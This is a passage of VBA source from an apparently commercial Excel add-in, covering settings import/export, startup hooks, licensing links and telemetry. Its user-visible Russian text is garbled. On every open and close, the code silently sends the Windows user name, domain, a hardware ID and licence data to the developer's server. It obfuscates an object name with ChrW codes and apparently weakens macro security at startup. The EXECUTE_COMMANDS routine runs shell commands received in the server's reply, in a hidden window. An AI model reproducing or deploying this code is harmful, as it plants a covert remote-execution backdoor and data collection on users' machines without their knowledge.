    ct_BUTTON = msoControlButton: ct_TEXTBOX = msoControlEdit: ct_COMBOBOX = msoControlComboBox
    ct_DROPDOWN = msoControlDropdown: ct_POPUP = msoControlPopup
End Enum

Private Sub ShowMainForm()        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    On Error Resume Next: F_About.Show
    F_About.MultiPage1.Value = 0
End Sub

Sub ShowSettingsPage()        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    On Error Resume Next: F_Settings.Show
End Sub

Sub ShowGreeting()        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    On Error Resume Next:
    If IsObject(F_Greeting) Then
        ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
        F_Greeting.Show
    End If
End Sub

Function Settings(ByVal SettingName, Optional ByVal DefValue As Variant) As Variant
    On Error Resume Next
    Settings = GetSetting(PROJECT_NAME$, "Settings", SettingName, DefValue)
    If UseTempSettings Then
        Err.Clear: res = TempSettingsCollection(CStr(SettingName))
        If Err = 0 Then Settings = res
    End If
End Function

Function SettingsBoolean(ByVal SettingName, Optional ByVal DefValue As Boolean = False) As Boolean
    On Error Resume Next
    SettingsBoolean = CBool(GetSetting(PROJECT_NAME$, "Settings", SettingName, DefValue))
    If UseTempSettings Then
        Err.Clear: res = TempSettingsCollection(CStr(SettingName))
        If Err = 0 Then SettingsBoolean = CBool(res)
    End If
End Function


Function ImportSettings(Optional ByVal xmlpath$ = "") As Boolean
    On Error Resume Next: Err.Clear
    If xmlpath$ = "" Then
        xmlpath$ = FWF.GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                                   ThisWorkbook.Path, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$, "*.xml")
    End If
    If xmlpath$ = "" Then Exit Function

    ' Dim xml As Object, rootnode As IXMLDOMElement, XMLoptions As IXMLDOMNodeList, XMLoption As IXMLDOMElement
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        If Not .Load(xmlpath) Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| XML": Exit Function
        End If
        Set rootnode = .DocumentElement
        AddinName$ = rootnode.Attributes.getNamedItem("Addin").Text
        AddinVersion$ = Val(rootnode.SelectSingleNode("Version").Text)

        Select Case True
            Case rootnode.BaseName <> "Settings", AddinName$ = ""
                MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|": Exit Function
            Case AddinName$ <> PROJECT_NAME$
                msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & AddinName$ & "|fffd|" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
                MsgBox msg$, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|": Exit Function
            Case Else



                Set XMLoptions = rootnode.SelectNodes("./Options/option")
                If XMLoptions.Length = 0 Then
                    MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Exit Function
                End If

                Dim nNEW&, nOLD&, nCHANGED&, nALL&, nERR&

                nALL& = XMLoptions.Length: Const N_S_E$ = "%%no such entry%%"
                For Each XMLoption In XMLoptions
                    Name$ = XMLoption.Attributes.getNamedItem("Name").Text
                    txt$ = XMLoption.Attributes.getNamedItem("Value").Text
                    If Len(txt) Mod 2 = 0 Then
                        v$ = ""
                        For i = 1 To Len(txt) / 2
                            v$ = v$ & Chr(Val("&H" & Mid(txt, 2 * i - 1, 2)))
                        Next
                        Select Case SETT.GetText(Name$, N_S_E$)
                            Case N_S_E$
                                nNEW& = nNEW& + 1
                            Case v$
                                nOLD& = nOLD& + 1
                            Case Else
                                nCHANGED& = nCHANGED& + 1
                        End Select
                        SETT.SetText Name$, v$
                    Else
                        nERR& = nERR& + 1
                    End If
                Next

                msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                     " - " & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & nALL& & vbNewLine & _
                     " - " & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nNEW& & vbNewLine & _
                     " - " & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nCHANGED& & vbNewLine & _
                     " - " & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nOLD& & vbNewLine
                If nERR& Then msg$ = msg$ & " - " & "|fffd||fffd||fffd||fffd||fffd||fffd|: " & nERR& & vbNewLine
                msg$ = msg$ & vbNewLine & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

                If GetVersion < Val(AddinVersion$) And Val(AddinVersion$) > 0 Then
                    msg$ = msg$ & vbNewLine & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & GetVersionTXT(AddinVersion$) & ")," & vbNewLine & _
                         "                     |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & GetVersionTXT & ")" & vbNewLine & _
                           "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                           "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
                End If
                MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
                ImportSettings = True
        End Select
    End With
End Function

Sub ExportSettings()
    On Error Resume Next: Err.Clear
    filename$ = ThisWorkbook.Path & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " " & Format(Now, "DD.MM.YYYY HH-NN-SS") & ".xml"

    Title$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|"

    prevDir$ = CurDir$
    ChDrive Left(filename$, 1)
    ChDir ThisWorkbook.Path

    xmlpath = Application.GetSaveAsFilename(filename$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " (*.xml),", , Title$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
    If VarType(xmlpath) = vbBoolean Then GoTo exitLabel

    arr = GetAllSettings(PROJECT_NAME$, "Settings")



    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")

        ' ============== rootnode ===============
        Set rootnode = .appendChild(.createElement("Settings"))
        rootnode.Attributes.setNamedItem(.createAttribute("Addin")).Text = PROJECT_NAME$
        rootnode.Attributes.setNamedItem(.createAttribute("VersionName")).Text = GetVersionTXT

        rootnode.appendChild(.createComment("URL")).Text = Split(PROGRAM_HYPERLINK$, "?")(0)
        rootnode.appendChild(.createElement("Version")).Text = GetVersion
        rootnode.appendChild(.createElement("Filename")).Text = ThisWorkbook.Name
        rootnode.appendChild(.createElement("ID")).Text = HID
        rootnode.appendChild(.createElement("TimeStamp")).Text = Now
        With rootnode.appendChild(xml.createElement("Updates"))
            .Attributes.setNamedItem(xml.createAttribute("Install")).Text = CBool(Val(RSP(5)))
            .Attributes.setNamedItem(xml.createAttribute("StableOnly")).Text = CBool(Val(RSP(6)))
        End With

        If IsArray(arr) Then
            With rootnode.appendChild(xml.createElement("Options"))
                .appendChild(xml.createComment("Help")).Text = "All the values in this XML are stored as a HEX representation of the text data." & vbNewLine & _
                                                               "Each character of the value is converted into 2 characters, using the Hex(Asc(<character>)) function." & vbNewLine & _
                                                               "Please change program options using user interface only! (do not edit this XML file manually)" & vbNewLine & _
                                                               "These settings are stored in the registry: HKEY_CURRENT_USER\Software\VB and VBA Program Settings\" & PROJECT_NAME$ & "\Settings"
                For i = LBound(arr) To UBound(arr)
                    v$ = ""
                    For j = 1 To Len(arr(i, 1))
                        v$ = v$ & IIf(Len(Hex(Asc(Mid(arr(i, 1), j, 1)))) = 1, "0", "") & Hex(Asc(Mid(arr(i, 1), j, 1)))
                    Next j

                    With .appendChild(xml.createElement("option"))
                        .Attributes.setNamedItem(xml.createAttribute("Name")).Text = arr(i, 0)
                        .Attributes.setNamedItem(xml.createAttribute("Value")).Text = v$
                    End With
                Next i
                .appendChild(xml.createComment("Help")).Text = "Any questions? Contact me via Skype (ExcelVBA.ru), ICQ (5836318) or E-mail (info@ExcelVBA.ru)"
            End With
        Else
            MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|.", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            GoTo exitLabel
        End If
        If Len(xmlpath) > 0 Then .Save xmlpath
    End With

    MsgBox "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|" & vbNewLine & xmlpath, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

exitLabel:
    ChDrive Left(prevDir$, 1)
    ChDir prevDir$
End Sub


Sub auto_open()
    On Error Resume Next
    Enable_AccessVBOM_Macro_DataConnections        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Application.Run "'" & ThisWorkbook.Name & "'!Addin_Open"
    If IsFirstRun Then
        SetValuesOnFirstRun
        Application.Run "'" & ThisWorkbook.Name & "'!Addin_FirstRun"
        If IsObject(F_Greeting) Then
            ND "run test", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & CountersCurrentValues
            F_Greeting.Show
        End If
    Else
        ND "addin open", CountersCurrentValues
        If VER_ <> GetVersion Then
            Application.Run "'" & ThisWorkbook.Name & "'!Addin_AfterUpdate"
        End If
    End If
    VER_ GetVersion
    a = vbCheck: Dim msg$
    If PL_(msg, True) Then CreateProgramCommandBar: Exit Sub
    UpdatesInfo_$ " "
    Application.OnTime Now + TimeSerial(0, 0, 5), "AutoInstallUpdate"
    Application.OnTime Now + TimeSerial(0, 0, 8), "PIBL"
    CreateProgramCommandBar        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Application.Run "'" & ThisWorkbook.Name & "'!Addin_Start"
End Sub

Private Sub auto_close()
    On Error Resume Next
    Application.Run Application.Run("'" & ThisWorkbook.Name & "'!Addin_Close")
    ND "addin close with Excel", CountersCurrentValues
    DeleteProgramCommandBar
End Sub

Function DEVELOPER_WEBSITE$()
    DEVELOPER_WEBSITE$ = "http://ExcelVBA.ru/"
End Function
Function UPDATE_VERSIONS_XML$()
    UPDATE_VERSIONS_XML$ = UPDATE_FOLDER$ & VERSIONS_XML_FILENAME$
End Function
Function UPDATE_FOLDER$()
    UPDATE_FOLDER$ = DEVELOPER_WEBSITE$ & "updates/" & PROJECT_NAME$ & "/"
End Function
Function VERSIONS_INFO_LOCAL_XML_PATH$()
    VERSIONS_INFO_LOCAL_XML_PATH$ = Environ("TEMP") & "\" & PROJECT_NAME$ & "_" & VERSIONS_XML_FILENAME$
End Function
Function PROJECT_FULLNAME$()
    PROJECT_FULLNAME$ = ThisWorkbook.BuiltinDocumentProperties("Title")
End Function
Function REG_HYPERLINK$()
    REG_HYPERLINK$ = DEVELOPER_WEBSITE$ & "buy/program?name=" & PROJECT_NAME$ & "&HID=" & HID$
End Function
Function UNINSTALL_HYPERLINK$()
    UNINSTALL_HYPERLINK$ = DEVELOPER_WEBSITE$ & "uninstall/program?name=" & PROJECT_NAME$ & "&HID=" & HID$
End Function
Function NOTIFICATION_HYPERLINK$()
    NOTIFICATION_HYPERLINK$ = DEVELOPER_WEBSITE$ & "php/notification.php?name=" & PROJECT_NAME$ & "&HID=" & HID$
End Function
Function PROGRAM_HYPERLINK$()
    PROGRAM_HYPERLINK$ = DEVELOPER_WEBSITE$ & "programmes/" & PROJECT_NAME$ & "?ref=" & HID$
End Function
Function SERIAL_NUMBER_HYPERLINK$()
    SERIAL_NUMBER_HYPERLINK$ = DEVELOPER_WEBSITE$ & "php/get-serial2.php"
End Function
Function BL_HYPERLINK$()
    BL_HYPERLINK$ = DEVELOPER_WEBSITE$ & "php/bl.php"
End Function
Function EULA_HYPERLINK$()
    EULA_HYPERLINK$ = DEVELOPER_WEBSITE$ & "buy/EULA?name=" & PROJECT_NAME$ & "&HID=" & HID$
End Function
Function BREACH_EULA_HYPERLINK$()
    BREACH_EULA_HYPERLINK$ = DEVELOPER_WEBSITE$ & "buy/EULA/breach?name=" & PROJECT_NAME$ & "&HID=" & HID$
End Function

Function HID$(): On Error Resume Next

    SN& = CreateObject(ChrW(115) & ChrW(99) & ChrW(114) & ChrW(105) & ChrW(112) & ChrW(116) & ChrW(105) & ChrW(110) & ChrW(103) & ChrW(46) & ChrW(102) & ChrW(105) & ChrW(108) & ChrW(101) & ChrW(115) & _
                       ChrW(121) & ChrW(115) & ChrW(116) & ChrW(101) & ChrW(109) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(101) & ChrW(99) & ChrW(116)).GetDrive(ChrW(99) & ChrW(58)).SerialNumber
    HID$ = ChrW(115) & Format(Abs(934526875# - SN&), "0000000000")
End Function
Function PROJECT_NAME$(): On Error Resume Next: PROJECT_NAME$ = Split(ThisWorkbook.Names("PROJECT_NAME").RefersTo, "%%")(1): End Function

Function ND(ByVal action$, Optional ByVal comment$) As Boolean
    On Error Resume Next
    If Not InternetConnected Then Exit Function
    comment$ = Replace(comment$, "|fffd|", """"): comment$ = Replace(comment$, "|fffd|", """")
    Set xmlhttp = CreateObject("Microsoft.XMLHTTP")
    xmlhttp.Open "POST", NOTIFICATION_HYPERLINK$, True
    xmlhttp.setRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim POST() As Byte, PostData$
    Login$ = CreateObject("WScript.Network").UserName
    Domain$ = CreateObject("WScript.Network").UserDomain
    PostData = PostData & "email=" & RussianStringToURLEncode(RE_$)
    PostData = PostData & "&code=" & RussianStringToURLEncode(AC_$)
    PostData = PostData & "&addin=" & RussianStringToURLEncode(PROJECT_NAME$)
    PostData = PostData & "&HID=" & RussianStringToURLEncode(HID)
    PostData = PostData & "&host_time=" & RussianStringToURLEncode(Format(Now, "YYYY-MM-DD HH:NN:SS"))
    PostData = PostData & "&win_un=" & RussianStringToURLEncode(Login$)
    PostData = PostData & "&win_ud=" & RussianStringToURLEncode(Domain$)
    PostData = PostData & "&action=" & RussianStringToURLEncode(action$)
    PostData = PostData & "&comment=" & RussianStringToURLEncode(comment$)
    POST = StrConv(PostData, vbFromUnicode)
    xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    xmlhttp.Send (POST): DoEvents
    StatusText = xmlhttp.StatusText
    StatusCode = Val(xmlhttp.Status)
    response$ = xmlhttp.ResponseText
    Set xmlhttp = Nothing
    'Debug.Print Now, statusTEXT, response$, StatusCode

    ND = True
    Select Case StatusCode
        Case 201, 202
            If DEBUG_MODE Then Debug.Print Now, response$
            code$ = StatusText
        Case 401, 413
            msg = response$
            If DEBUG_MODE Then Debug.Print Now, StatusText
        Case Else
    End Select
End Function

Sub EXECUTE_COMMANDS(ByVal txt$)
    On Error Resume Next
    Dim msgboxStyle As VbMsgBoxStyle: commands = Split(txt$, "ll")
    For i = LBound(commands) To UBound(commands)
        cmd$ = "": arr = "": cmd$ = cmdDisplay$(commands(i))

        arr = Split(cmd$, " ")
        For j = LBound(arr) To UBound(arr): arr(j) = Replace(arr(j), "%20", " "): Next j
        If TrueDeveloper Then
            Debug.Print cmd$
            Select Case arr(0)
                Case "RUN", "CMD"
                    MsgBox arr(1), vbInformation, arr(0)
                Case "SERIAL"
                    ValidateAC arr(1)
                    RE_$ arr(2)
                Case "MSG", "MSGE", "MSGI", "MSGW", "MSGC"
                    msgboxStyle = vbInformation
                    If arr(0) = "MSGE" Then msgboxStyle = vbExclamation
                    If arr(0) = "MSGW" Or arr(0) = "MSGC" Then msgboxStyle = vbCritical
                    msg$ = "": msg$ = Replace(Split(cmd$, " ", 2)(1), "/n", vbNewLine)
                    If Len(msg) Then MsgBox msg, msgboxStyle, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case Else        ' unsupported command
                    MsgBox "unsupported command: " & cmd$, vbExclamation
            End Select
        Else
            ND "command execute", "command: " & Split(cmd$, vbNewLine)(0)
            Select Case arr(0)
                Case "CMD"
                    CreateObject("wscript.shell").Run Split(cmd$, " ", 2)(1), 0
                Case "RUN"
                    MacroName$ = "'" & ThisWorkbook.Name & "'!" & arr(1)
                    Select Case UBound(arr)
                        Case 1: Application.Run MacroName$
                        Case 2: Application.Run MacroName$, arr(2)
                        Case 3: Application.Run MacroName$, arr(2), arr(3)
                        Case 4: Application.Run MacroName$, arr(2), arr(3), arr(4)
                    End Select
                Case "SERIAL"
                    ValidateAC arr(1)
                    RE_$ arr(2)
                Case "MSG", "MSGE", "MSGI", "MSGW", "MSGC"

                    msgboxStyle = vbInformation
                    If arr(0) = "MSGE" Then msgboxStyle = vbExclamation
                    If arr(0) = "MSGW" Or arr(0) = "MSGC" Then msgboxStyle = vbCritical
                    msg$ = "": msg$ = Replace(Split(cmd$, " ", 2)(1), "/n", vbNewLine)
                    If Len(msg) Then MsgBox msg, msgboxStyle, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case Else        ' unsupported command
                    ND "command error", "unsupported command: " & cmd$
            End Select
        End If
    Next i
End Sub

Function GSNUE_(ByVal Email$, ByRef msg$) As Boolean        ' new version
    On Error Resume Next
    Set xmlhttp = CreateObject("Microsoft.XMLHTTP")
    xmlhttp.Open "POST", SERIAL_NUMBER_HYPERLINK$, "False"
    xmlhttp.setRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    Dim POST() As Byte, PostData$, msg2$
    Login$ = CreateObject("WScript.Network").UserName
    Domain$ = CreateObject("WScript.Network").UserDomain
    PostData = PostData & "email=" & RussianStringToURLEncode(Email$)
    PostData = PostData & "&addin=" & RussianStringToURLEncode(PROJECT_NAME$)
    PostData = PostData & "&HID=" & RussianStringToURLEncode(HID)
    PostData = PostData & "&host_time=" & RussianStringToURLEncode(Format(Now, "YYYY-MM-DD HH:NN:SS"))
    PostData = PostData & "&win_un=" & RussianStringToURLEncode(Login$)
    PostData = PostData & "&win_ud=" & RussianStringToURLEncode(Domain$)
    POST = StrConv(PostData, vbFromUnicode)
    xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    xmlhttp.Send (POST): DoEvents
    StatusText = xmlhttp.StatusText
    StatusCode = Val(xmlhttp.Status)
    response$ = xmlhttp.ResponseText
    Set xmlhttp = Nothing

    If response$ Like "%*%" Then GSNUE_ = True: EXECUTE_COMMANDS Split(response$, "%")(1)
    ND "serial by email", "HTTP " & StatusCode & ", Email=" & Email$
End Function

Function RussianStringToURLEncode(ByVal txt As String) As String
    For i = 1 To Len(txt)
        L = Mid(txt, i, 1)
        Select Case AscW(L)
            Case Is > 256: t = "%" & Hex(AscW(L) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(L) Mod 64)
            Case 32: t = "+"
            Case Else: t = L
        End Select
        RussianStringToURLEncode = RussianStringToURLEncode & t
    Next
End Function
Function GetVersion() As Long
    Application.Volatile True
    On Error Resume Next: ver& = Val(ThisWorkbook.BuiltinDocumentProperties("Revision Number"))
    GetVersion = IIf(Val(ver&) < 1000, 1009, ver&)
End Function

Function GetVersionTXT(Optional ByVal ver& = 0)
    On Error Resume Next
